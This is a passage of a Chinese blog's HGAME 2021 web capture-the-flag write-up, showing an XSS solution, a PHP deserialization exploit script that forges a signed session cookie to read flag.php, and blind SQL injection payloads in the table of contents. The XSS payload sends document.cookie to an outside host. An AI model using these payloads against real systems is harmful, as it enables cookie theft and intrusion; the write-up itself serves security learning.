class="line">拿剩下的就简单了，由于会添加上`&lt;b&gt;`，`src`会解析错误。于是要闭合`src`再用`onload`去执行js，由于`&quot;`被过滤于是用`&apos;`</span><br><span class="line">于是就是先创建`&lt;iframe src=&apos;x&apos;&gt;`</span><br><span class="line">然后查询</span><br><span class="line">``x[&apos;onload=&apos;t=new XMLHttpRequest;t.open(`GET`, `http://ip/?a`+document.cookie,!0),t.send();&apos;&apos;]?``</span><br><span class="line">Search后的就替换成了（加上空格好理解一些）</span><br><span class="line">``&lt;iframe src=&apos;&lt;b class=&quot;search_result&quot;&gt;x[&apos; onload=&apos;t=new XMLHttpRequest;t.open(`GET`, `http://ip/?a`+document.cookie,!0),t.send();&apos; &apos;]?&lt;/b&gt;&apos;&gt;``</span><br><span class="line">就会执行`onload`中的内容</span><br><span class="line"></span><br><span class="line">最后依旧是拿弹回的token去访问`/flag`</span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/b05e0dfe1d51cda5952c641b0febf81c.png)</span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/0bab4942b85b3c094298e62733b79c25.png)</span><br><span class="line"></span><br><span class="line">## Arknights</span><br><span class="line">这题是一道简单的反序列化题目，题目里提示了有`git`，于是用`GitHack`抓一下源码</span><br><span class="line"></span><br><span class="line">![](http://shifeng-kaze.cn/blog/hgame2021_web_wp/403db4c44afdf7a5afca7488862ffa7e.png)</span><br><span class="line"></span><br><span class="line">获得源码后，`index.php`中可以看到</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?php<br>error_reporting(0);<br>require_once (“simulator.php”);<br>$simulator = new Simulator();<br>$cards = array();<br>if(isset($_POST[“draw”])){<br>    $cards = $simulator-&gt;draw($_POST[“draw”]);<br>}<br>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用了`Simulator`类，除此之外都是输出的东西，没什么可利用的</span><br><span class="line"></span><br><span class="line">而`pool.php`只是一堆数据，那主要就是`simulator.php`了</span><br></pre></td></tr></table></figure></p>
+<p>class Simulator{</p>
+<pre><code>public $session;
+public $cardsPool;
+
+public function __construct(){
+
+    $this-&gt;session = new Session();
+    if(array_key_exists(&quot;session&quot;, $_COOKIE)){
+        $this-&gt;session-&gt;extract($_COOKIE[&quot;session&quot;]);
+    }
+
+    $this-&gt;cardsPool = new CardsPool(&quot;./pool.php&quot;);
+    $this-&gt;cardsPool-&gt;init();
+}
+
+public function draw($count){
+    $result = array();
+
+    for($i=0; $i&lt;$count; $i++){
+        $card = $this-&gt;cardsPool-&gt;draw();
+
+        if($card[&quot;stars&quot;] == 6){
+            $this-&gt;session-&gt;set(&apos;&apos;, $card[&quot;No&quot;]);
+        }
+
+        $result[] = $card;
+    }
+
+    $this-&gt;session-&gt;save();
+
+    return $result;
+}
+
+public function getLegendary(){
+    $six = array();
+
+    $data = $this-&gt;session-&gt;getAll();
+    foreach ($data as $item) {
+        $six[] = $this-&gt;cardsPool-&gt;cards[6][$item];
+    }
+
+    return $six;
+}
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看到`Simulator`类中构造函数获得`cookie`中的`session`键的值，并用`Session`类对其进行了`extract()`处理</span><br><span class="line"></span><br><span class="line">于是到`Session`类中去看看</span><br></pre></td></tr></table></figure></p>
+<p>class Session{</p>
+<pre><code>private $sessionData;
+
+const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;
+
+public function __construct(){}
+
+public function set($key, $value){
+    if(empty($key)){
+        $this-&gt;sessionData[] = $value;
+    }else{
+        $this-&gt;sessionData[$key] = $value;
+    }
+}
+
+public function getAll(){
+    return $this-&gt;sessionData;
+}
+
+
+public function save(){
+
+    $serialized = serialize($this-&gt;sessionData);
+    $sign = base64_encode(md5($serialized . self::SECRET_KEY));
+    $value = base64_encode($serialized) . &quot;.&quot; . $sign;
+
+    setcookie(&quot;session&quot;,$value);
+}
+
+
+public function extract($session){
+
+    $sess_array = explode(&quot;.&quot;, $session);
+    $data = base64_decode($sess_array[0]);
+    $sign = base64_decode($sess_array[1]);
+
+    if($sign === md5($data . self::SECRET_KEY)){
+        $this-&gt;sessionData = unserialize($data);
+    }else{
+        unset($this-&gt;sessionData);
+        die(&quot;Go away! You hacker!&quot;);
+    }
+}
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看到`session`是以`.`分为两部分，前面是数据后面是签名，验证成功则反序列化</span><br><span class="line"></span><br><span class="line">接着看看哪里有可以利用的地方</span><br></pre></td></tr></table></figure></p>
+<p>class CardsPool<br>{</p>
+<pre><code>public $cards;
+private $file;
+
+public function __construct($filePath)
+{
+    if (file_exists($filePath)) {
+        $this-&gt;file = $filePath;
+    } else {
+        die(&quot;Cards pool file doesn&apos;t exist!&quot;);
+    }
+}
+
+public function draw()
+{
+    $rand = mt_rand(1, 100);
+    $level = 0;
+
+    if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) {
+        $level = 3;
+    } elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) {
+        $level = 4;
+    } elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) {
+        $level = 5;
+    } elseif ($rand == 100) {
+        $level = 6;
+    }
+
+    $rand_key = array_rand($this-&gt;cards[$level]);
+
+    return array(
+        &quot;stars&quot; =&gt; $level,
+        &quot;No&quot; =&gt; $rand_key,
+        &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key]
+    );
+}
+
+public function init()
+{
+    $this-&gt;cards = include($this-&gt;file);
+}
+
+public function __toString(){
+    return file_get_contents($this-&gt;file);
+}
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">于是就找到了`CardsPool`这个类，可以看到这个类的`__toString()`是可以读取文件的。再去找找有什么地方有输出的，就找到了`Eeeeeeevallllllll`类</span><br></pre></td></tr></table></figure></p>
+<p>class Eeeeeeevallllllll{<br>    public $msg=”坏坏liki到此一游”;</p>
+<pre><code>public function __destruct()
+{
+    echo $this-&gt;msg;
+}
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">一看就是专门给我们留的后门，`echo`输出`msg`，那只要把这个变量设置成`CardsPool`类，再将`CardsPool`类中的`file`设置为`./flag.php`即可</span><br><span class="line"></span><br><span class="line">exp</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?php<br>class CardsPool{<br>    private $file = “./flag.php”;<br>}<br>class Eeeeeeevallllllll{<br>    public $msg;<br>    public function __construct(){<br>        $this-&gt;msg= new CardsPool();<br>    }<br>}</p>
+<p>$class = new Eeeeeeevallllllll();<br>$data = serialize($class);<br>$sign = md5($data . “7tH1PKviC9ncELTA1fPysf6NYq7z7IA9”);</p>
+<p>$sign = base64_encode($sign);<br>$data = base64_encode($data);</p>
+<p>$session = $data.”.”.$sign;<br>echo urlencode($session);<br><code>`</code></p>
+<p>将生成的<code>session</code>放入<code>cookie</code>中，然后刷新查看源码即可</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2021_web_wp/92158ec445decdb11741ececf85f50d2.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/05/De1CTF2020-web-wp/" rel="next" title="De1CTF2020 web 复现">
+                <i class="fa fa-chevron-left"></i> De1CTF2020 web 复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/12/22/sec21-shen-kaiwen/" rel="prev" title="身份验证链上的弱点:针对电子邮件发件人欺骗攻击的大规模分析">
+                身份验证链上的弱点:针对电子邮件发件人欺骗攻击的大规模分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Week1"><span class="nav-number">1.</span> <span class="nav-text">Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hitchhiking-in-the-Galaxy"><span class="nav-number">1.1.</span> <span class="nav-text">Hitchhiking_in_the_Galaxy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#watermelon"><span class="nav-number">1.2.</span> <span class="nav-text">watermelon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宝藏走私者"><span class="nav-number">1.3.</span> <span class="nav-text">宝藏走私者</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前端处理CL-Content-Length-而后端不处理"><span class="nav-number">1.3.1.</span> <span class="nav-text">前端处理CL(Content-Length)而后端不处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#同一请求中有两个CL，而前端只处理第一个，后端处理第二个（CL-CL）"><span class="nav-number">1.3.2.</span> <span class="nav-text">同一请求中有两个CL，而前端只处理第一个，后端处理第二个（CL-CL）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在http请求中存在CL和TE-Transfer-Encoding-，前端只处理的是CL，后端只处理TE（CL-TE）"><span class="nav-number">1.3.3.</span> <span class="nav-text">在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前端只处理TE，后端只处理CL（TE-CL）"><span class="nav-number">1.3.4.</span> <span class="nav-text">前端只处理TE，后端只处理CL（TE-CL）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前后端都处理TE"><span class="nav-number">1.3.5.</span> <span class="nav-text">前后端都处理TE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3192-如果字段名称后面和冒号前面有空格，则返回400"><span class="nav-number">1.3.6.</span> <span class="nav-text">3192 如果字段名称后面和冒号前面有空格，则返回400</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3201-当返回400错误时，关闭连接"><span class="nav-number">1.3.7.</span> <span class="nav-text">3201 当返回400错误时，关闭连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3231-验证请求中的Content-Length头"><span class="nav-number">1.3.8.</span> <span class="nav-text">3231 验证请求中的Content-Length头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3251-当缓存命中时，清空请求体"><span class="nav-number">1.3.9.</span> <span class="nav-text">3251 当缓存命中时，清空请求体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#智商检测鸡"><span class="nav-number">1.4.</span> <span class="nav-text">智商检测鸡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#走私者的愤怒"><span class="nav-number">1.5.</span> <span class="nav-text">走私者的愤怒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LazyDogR4U"><span class="nav-number">1.6.</span> <span class="nav-text">LazyDogR4U</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Post-to-zuckonit"><span class="nav-number">1.7.</span> <span class="nav-text">Post to zuckonit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#200OK"><span class="nav-number">1.8.</span> <span class="nav-text">200OK!!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Liki的生日礼物"><span class="nav-number">1.9.</span> <span class="nav-text">Liki的生日礼物</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week3"><span class="nav-number">2.</span> <span class="nav-text">Week3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Liki-Jail"><span class="nav-number">2.1.</span> <span class="nav-text">Liki-Jail</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#coding-utf8"><span class="nav-number">3.</span> <span class="nav-text">-- coding:utf8 --</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-length-database-gt-0-sleep-6-1"><span class="nav-number">4.</span> <span class="nav-text">or/**/if(length(database())&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-ascii-substr-database-1-1-gt-0-sleep-6-1"><span class="nav-number">5.</span> <span class="nav-text">or/**/if(ascii(substr(database(),1,1))&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#week3sqli"><span class="nav-number">6.</span> <span class="nav-text">week3sqli</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-select-length-table-name-from-information-schema-tables-where-table-schema-like-database-limit-0-1-gt-0-sleep-6-1"><span class="nav-number">7.</span> <span class="nav-text">or//if((select//length(table_name)//from//information_schema.tables//where//table_schema//like//database()//limit//0,1)&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-like-database-limit-0-1-1-1-gt-0-sleep-6-1"><span class="nav-number">8.</span> <span class="nav-text">or//if(ascii(substr((select//table_name//from//information_schema.tables//where//table_schema//like//database()//limit//0,1),1,1))&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#u5ers"><span class="nav-number">9.</span> <span class="nav-text">u5ers</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-select-length-column-name-from-information-schema-columns-where-table-schema-like-database-limit-0-1-gt-0-sleep-6-1"><span class="nav-number">10.</span> <span class="nav-text">or//if((select//length(column_name)//from//information_schema.columns//where//table_schema//like//database()//limit//0,1)&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-ascii-substr-select-column-name-from-information-schema-columns-where-table-schema-like-database-limit-0-1-1-1-gt-0-sleep-6-1"><span class="nav-number">11.</span> <span class="nav-text">or//if(ascii(substr((select//column_name//from//information_schema.columns//where//table_schema//like//database()//limit//0,1),1,1))&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#usern-me"><span class="nav-number">12.</span> <span class="nav-text">usern@me</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-select-length-column-name-from-information-schema-columns-where-table-schema-like-database-limit-1-1-gt-0-sleep-6-1"><span class="nav-number">13.</span> <span class="nav-text">or//if((select//length(column_name)//from//information_schema.columns//where//table_schema//like//database()//limit//1,1)&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-ascii-substr-select-column-name-from-information-schema-columns-where-table-schema-like-database-limit-1-1-1-1-gt-0-sleep-6-1"><span class="nav-number">14.</span> <span class="nav-text">or//if(ascii(substr((select//column_name//from//information_schema.columns//where//table_schema//like//database()//limit//1,1),1,1))&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#p-ssword"><span class="nav-number">15.</span> <span class="nav-text">p@ssword</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-select-length-usern-me-from-u5ers-gt-0-sleep-6-1"><span class="nav-number">16.</span> <span class="nav-text">or//if((select//length(usern@me)//from//u5ers)&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-ascii-substr-select-usern-me-from-u5ers-0-1-gt-0-sleep-6-1"><span class="nav-number">17.</span> <span class="nav-text">or//if(ascii(substr((select//usern@me//from//u5ers),0,1))&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#admin"><span class="nav-number">18.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-select-length-p-ssword-from-u5ers-lt-0-sleep-6-1"><span class="nav-number">19.</span> <span class="nav-text">or//if((select//length(p@ssword)//from//u5ers)&lt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#or-if-ascii-substr-select-p-ssword-from-u5ers-0-1-gt-0-sleep-6-1"><span class="nav-number">20.</span> <span class="nav-text">or//if(ascii(substr((select//p@ssword//from//u5ers),0,1))&gt;0,sleep(6),1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sOme7hiNgseCretw4sHidd3n"><span class="nav-number">21.</span> <span class="nav-text">sOme7hiNgseCretw4sHidd3n</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
